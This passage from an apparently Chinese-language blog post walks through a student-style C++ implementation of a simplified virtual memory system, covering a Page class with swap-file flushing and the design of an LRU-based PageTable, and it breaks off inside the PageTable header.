data-num=\"30\"></td><td><pre>        std<span class=\"token double-colon punctuation\">::</span>cerr <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"Swap file read failed!\"</span> <span class=\"token operator\">&lt;&lt;</span> std<span class=\"token double-colon punctuation\">::</span>endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">this</span><span class=\"token operator\">-></span>dirty_ <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>  <span class=\"token comment\">// Constructs a new Page object that is a copy of</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  <span class=\"token comment\">// another page object. Both pages will have</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>  <span class=\"token comment\">// the same page number and swap_file, but should</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>  <span class=\"token comment\">// have independent copies of the page data.</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>  <span class=\"token comment\">// Misc: this means that there could be issues with</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>  <span class=\"token comment\">// having the original and copy page having differnt</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>  <span class=\"token comment\">// data. This cctor should only really be used</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>  <span class=\"token comment\">// in the context of managing pages with something</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>  <span class=\"token comment\">// like STL, where the original page used for the cctor</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>  <span class=\"token comment\">// will be discarded. In real C++, we would want to</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>  <span class=\"token comment\">// use move semantics here.</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>  <span class=\"token comment\">// Arguements:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>  <span class=\"token comment\">//   - other: the page we are copying</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>  <span class=\"token class-name\">Page</span><span class=\"token double-colon punctuation\">::</span><span class=\"token function\">Page</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> Page<span class=\"token operator\">&amp;</span> other<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span><span class=\"token function\">swap_file_</span><span class=\"token punctuation\">(</span>other<span class=\"token punctuation\">.</span>swap_file_<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token keyword\">this</span><span class=\"token operator\">-></span>virtual_pno_ <span class=\"token operator\">=</span> other<span class=\"token punctuation\">.</span>virtual_pno_<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token keyword\">this</span><span class=\"token operator\">-></span>bytes_ <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token keyword\">uint8_t</span><span class=\"token punctuation\">[</span>PAGE_SIZE<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token operator\">-></span>bytes_<span class=\"token punctuation\">,</span>other<span class=\"token punctuation\">.</span>bytes_<span class=\"token punctuation\">,</span>PAGE_SIZE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token keyword\">this</span><span class=\"token operator\">-></span>dirty_ <span class=\"token operator\">=</span> other<span class=\"token punctuation\">.</span>dirty_<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>  <span class=\"token comment\">// Destructor for the page object</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>  <span class=\"token comment\">// Cleans up any dynamically allocated data or</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>  <span class=\"token comment\">// otherwise allocated resources AND should flush</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>  <span class=\"token comment\">// its contents if the page is dirty at time of</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>  <span class=\"token comment\">// destruction.</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>  <span class=\"token class-name\">Page</span><span class=\"token double-colon punctuation\">::</span><span class=\"token operator\">~</span><span class=\"token function\">Page</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>dirty_<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>        <span class=\"token function\">flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    dirty_ <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    <span class=\"token keyword\">delete</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> bytes_<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>  <span class=\"token comment\">// Set the current Page object so that is a copy of</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>  <span class=\"token comment\">// another page object. Both pages will have</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>  <span class=\"token comment\">// the same page number and swap_file, but should</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>  <span class=\"token comment\">// have independent copies of the page data.</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>  <span class=\"token comment\">// Misc: this means that there could be issues with</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>  <span class=\"token comment\">// having the original and copy page having differnt</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>  <span class=\"token comment\">// data. This op= should only really be used</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>  <span class=\"token comment\">// in the context of managing pages with something</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>  <span class=\"token comment\">// like STL, where the original page used for the cctor</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>  <span class=\"token comment\">// will be discarded. In real C++, we would want to</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>  <span class=\"token comment\">// use move semantics here.</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>  <span class=\"token comment\">// You can assume each page has the same swap_file.</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>  <span class=\"token comment\">// Arguements:</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>  <span class=\"token comment\">//   - rhs: the page we are copying</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>  Page<span class=\"token operator\">&amp;</span> Page<span class=\"token double-colon punctuation\">::</span><span class=\"token keyword\">operator</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> Page<span class=\"token operator\">&amp;</span> rhs<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token operator\">!=</span><span class=\"token operator\">&amp;</span>rhs<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>        <span class=\"token keyword\">this</span><span class=\"token operator\">-></span><span class=\"token operator\">~</span><span class=\"token function\">Page</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>        <span class=\"token keyword\">new</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token function\">Page</span><span class=\"token punctuation\">(</span>rhs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token operator\">*</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>  <span class=\"token comment\">// This function is not required, but you may add it</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>  <span class=\"token comment\">// if it is needed for some of the STL containers</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>  <span class=\"token comment\">// you use in PageTable</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>  <span class=\"token comment\">// Determines if this page should go before another page if they</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>  <span class=\"token comment\">// were in sorted order.</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>  <span class=\"token comment\">// Arguments:</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>  <span class=\"token comment\">//   - rhs: the Page we are comparing this to</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>  <span class=\"token comment\">// Returns: true iff this page would show up before the other</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>  <span class=\"token comment\">// page in sorted order. False otherwise.</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>  <span class=\"token keyword\">bool</span> Page<span class=\"token double-colon punctuation\">::</span><span class=\"token keyword\">operator</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> Page<span class=\"token operator\">&amp;</span> rhs<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token operator\">-></span>virtual_pno_ <span class=\"token operator\">&lt;</span> rhs<span class=\"token punctuation\">.</span>virtual_pno_<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>  <span class=\"token comment\">// Returns the virtual page number of this page</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>  <span class=\"token comment\">// Arguments: None</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>  <span class=\"token comment\">// Returns: this page's virtual page number</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>  pno_t <span class=\"token class-name\">Page</span><span class=\"token double-colon punctuation\">::</span><span class=\"token function\">pno</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token operator\">-></span>virtual_pno_<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>  <span class=\"token comment\">// Returns whether or not a page is dirty</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>  <span class=\"token comment\">// A page is \"dirty\" if someone has written to the data managed</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>  <span class=\"token comment\">// by the page since the last time the page was flush()'d.</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>  <span class=\"token comment\">// Arguments: None</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>  <span class=\"token comment\">// Returns: Whether this page is dirty or not</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>  <span class=\"token keyword\">bool</span> <span class=\"token class-name\">Page</span><span class=\"token double-colon punctuation\">::</span><span class=\"token function\">dirty</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token operator\">-></span>dirty_<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>  <span class=\"token comment\">// Flushes the page to the swap file if it is dirty.</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>  <span class=\"token comment\">// Flushing a page to the swap file involves writing</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>  <span class=\"token comment\">// the page at the the spot correspoding to its page number</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>  <span class=\"token comment\">// in the swap_file. For a description of what it means</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre>  <span class=\"token comment\">// for a page to be dirty, see the dirty() member function.</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>  <span class=\"token comment\">// The page should not be written if it is not dirty.</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>  <span class=\"token comment\">// Arguments: None</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>  <span class=\"token comment\">// Returns: Nothing</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token class-name\">Page</span><span class=\"token double-colon punctuation\">::</span><span class=\"token function\">flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">dirty</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre>        <span class=\"token comment\">// seek the correct position</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>        swap_file_<span class=\"token punctuation\">.</span><span class=\"token function\">seekg</span><span class=\"token punctuation\">(</span>virtual_pno_ <span class=\"token operator\">*</span> PAGE_SIZE<span class=\"token punctuation\">,</span>std<span class=\"token double-colon punctuation\">::</span>ios<span class=\"token double-colon punctuation\">::</span>beg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre>        <span class=\"token comment\">// write to the swap file</span></pre></td></tr><tr><td data-num=\"149\"></td><td><pre>        swap_file_<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>bytes_<span class=\"token punctuation\">,</span>PAGE_SIZE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>swap_file_<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"151\"></td><td><pre>            std<span class=\"token double-colon punctuation\">::</span>cerr <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"Swap file write failed!\"</span> <span class=\"token operator\">&lt;&lt;</span> std<span class=\"token double-colon punctuation\">::</span>endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"152\"></td><td><pre>            <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"153\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"154\"></td><td><pre>        dirty_ <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"155\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"157\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h1 id=\"pagetable实现\"><a class=\"markdownIt-Anchor\" href=\"#pagetable实现\">#</a> PageTable 实现</h1>\n<h2 id=\"pagetable-源码分析\"><a class=\"markdownIt-Anchor\" href=\"#pagetable-源码分析\">#</a> PageTable 源码分析</h2>\n<p>PageTable 的作用如下：</p>\n<ul>\n<li>管理一个进程的地址空间</li>\n<li>包括 <code>swap_file</code></li>\n<li>从 physical memory 中读取页</li>\n<li>选择页淘汰，进行页替换</li>\n</ul>\n<p><code>PageTable.cc</code>  中有如下一些方法：</p>\n<ul>\n<li><code>PageTable(std::string swap_file_name, size_t page_capacity);</code>\n<ul>\n<li>初始化页表，制定 <code>swap_file</code>  名称和页容量</li>\n<li>存储的页不可超过页容量</li>\n</ul>\n</li>\n<li><code>~PageTable();</code>\n<ul>\n<li>清理所有变量</li>\n<li>flush dirty pages</li>\n</ul>\n</li>\n<li><code>Page&amp; get_page(uint32_t virtual_address);</code>\n<ul>\n<li>返回一个虚拟地址对应的 page</li>\n<li>将该页导入 physical memory</li>\n<li>返回它</li>\n<li>有几种可能情况\n<ul>\n<li>该页在 Physical memory 中，返回对应的页的引用，并且将该页标记为最新（挪到 vector 最前）</li>\n<li>该页不在 physical memory 中，并且 physical memory 还没满。那么将其导入 physical memory，并且标记为最新（挪到 vector 最前），返回该页引用</li>\n<li>该页不在 Physical memory 中，并且 physical memory 已经满了，那么先执行淘汰算法，淘汰最老的页，将其写入 <code>swap_file</code> 。然后将该页从 <code>swap_file</code>  中导入进来，放在 vector 最前</li>\n</ul>\n</li>\n<li>注意：\n<ul>\n<li>virtual address != 页号，可能有多个 virtual address 对应同一个页号 (一页有 4096 个字节嘛)</li>\n<li>页的最新和最老完全取决于 <code>get_page</code>  函数的调用情况</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><code>size_t capacity();</code>\n<ul>\n<li>返回页容量</li>\n</ul>\n</li>\n<li><code>size_t loaded_pages();</code>\n<ul>\n<li>返回导入 physical memory 的页数目</li>\n</ul>\n</li>\n<li><code>bool page_available(pno_t virtual_pno);</code>\n<ul>\n<li>返回对应页是否存在 physical memory 中</li>\n</ul>\n</li>\n<li><code>void flush_all_pages();</code>\n<ul>\n<li>将所有页都刷新到 <code>swap_file</code>  中</li>\n</ul>\n</li>\n<li><code>void flush_page(pno_t virtual_pno);</code>\n<ul>\n<li>将对应的页刷新到 <code>swap_file</code>  中</li>\n</ul>\n</li>\n<li><code>void discard_page(pno_t virtual_pno);</code>\n<ul>\n<li>从页表中丢弃对应的页。如果该页不存在，则返回。否则，若该页为 dirty，则将该页数据写入 <code>swap_file</code> ，然后丢弃它</li>\n</ul>\n</li>\n<li><code>void evict_page();</code>\n<ul>\n<li>若没有 page 在页表中，则什么也不做。否则丢弃最老的一页（丢弃前记得将其写入 <code>swap_file</code> ）</li>\n</ul>\n</li>\n</ul>\n<p><code>PageTable.cc</code>  有两个 <code>private</code>  变量：</p>\n<ul>\n<li><code>fstream swap_file_</code> : 交换文件</li>\n<li><code>size_t capacity</code> : 页容量</li>\n<li><code>size_t page_num</code> : 当前已经导入 physical memory 的页数目</li>\n<li><code>std::vector&lt;Page*&gt; page_list</code> : 记录所有在 physical memory 中的页</li>\n<li><code>std::unordered_map&lt;pno_t,Page*&gt; mp</code> :</li>\n</ul>\n<h2 id=\"pagetableh设计\"><a class=\"markdownIt-Anchor\" href=\"#pagetableh设计\">#</a>  <code>PageTable.h</code>  设计</h2>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">ifndef</span> <span class=\"token expression\">PAGE_TABLE_H_</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">PAGE_TABLE_H_</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;fstream></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;cstdint></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">// #include &lt;vector></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unordered_map></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;list></span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">\"./Page.h\"</span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">using</span> std<span class=\"token double-colon punctuation\">::</span>fstream<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">namespace</span> simplevm <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">///////////////////////////////////////////////////////////////////////////////</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">// A PageTable manages a processes memeory for our simplified</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">// virtual memory model. This involves managing a swap_file</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">// which is where pages of data are stored when they aren't loaded</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">// into physical memory. For our software model, we will say a page</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\">// is in \"physical memory\" if it is loaded into our memory space</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">// (e.g. it is on the heap). Pages that aren't loaded in will have</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">// their contents stored in the swap_file and will not have an</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">// associated Page object (see Page.h). Our page table can only have</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\">// so many pages stored in memory at one time, which is specified</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\">// on PageTable Creation. We implement an LRU page replacement</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\">// policy to decide which pages to evict if we need to load a new page</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\">// and we already have reached our capacity on the numberof pages we can</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\">// hold.</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\">// Users can get a page from the cache, flush pages to the swap_file,</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token comment\">// request any page is evicted, and specifically ask for a page to be evicted.</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\">///////////////////////////////////////////////////////////////////////////////</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">PageTable</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre> <span class=\"token keyword\">public</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>  <span class=\"token comment\">// Constructs a new page table with the specified</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  <span class=\"token comment\">// swap file and the specified page capacity, which is</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>  <span class=\"token comment\">// the number of pages that can be held in memory</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>  <span class=\"token comment\">// at one time. There cannot be more than page_capacity</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  <span class=\"token comment\">// number of pages loaded in at a time.</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>  <span class=\"token comment\">// Arguments:</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>  <span class=\"token comment\">//   - swap_file_name: the name of the swap_file</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>  <span class=\"token comment\">//   - page_capacity: the maximum number of pages that can be held</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>  <span class=\"token comment\">//     in memory at one time.</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>  <span class=\"token function\">PageTable</span><span class=\"token punctuation\">(</span>std<span class=\"token double-colon punctuation\">::</span>string swap_file_name<span class=\"token punctuation\">,</span> size_t page_capacity<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>  <span class=\"token comment\">// Destructs the page table, freeing any allocated resources</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>  <span class=\"token comment\">// and flushing any pages currently loaded into memory that</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>  <span class=\"token comment\">// are dirty</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>  <span class=\"token operator\">~</span><span class=\"token function\">PageTable</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>  <span class=\"token comment\">// Given a virtual address, gets the associated</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>  <span class=\"token comment\">// page for that virtual address. This page will</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>  <span class=\"token comment\">// be \"loaded\" into physical memory by the time it</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>  <span class=\"token comment\">// is returned.</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>  <span class=\"token comment\">// There are three possiblities when a page is requested:</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>  <span class=\"token comment\">// 1. The page is currently in the \"loaded\" and in the cache.</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>  <span class=\"token comment\">//    In this case, a reference to the page is returned 